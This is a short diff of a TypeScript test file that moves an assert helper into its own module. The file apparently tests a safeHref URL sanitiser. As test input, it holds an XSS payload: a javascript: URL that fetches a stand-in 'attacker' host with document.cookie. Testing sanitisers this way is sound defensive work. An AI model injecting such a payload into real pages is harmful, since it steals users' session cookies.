@@ -9,6 +9,7 @@ import { existsSync, readFileSync } from 'node:fs';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { JSDOM } from 'jsdom';
+import { assert } from './assertions.js';
 import { SAFE_SCHEMES, safeHref } from './safe-url.js';
 
 /**
@@ -38,9 +39,6 @@ function repoRoot(): string {
   return dir;
 }
 
-function assert(condition: boolean, message: string): void {
-  if (!condition) throw new Error(message);
-}
 
 const XSS = "javascript:fetch('//attacker/'+document.cookie)";
 
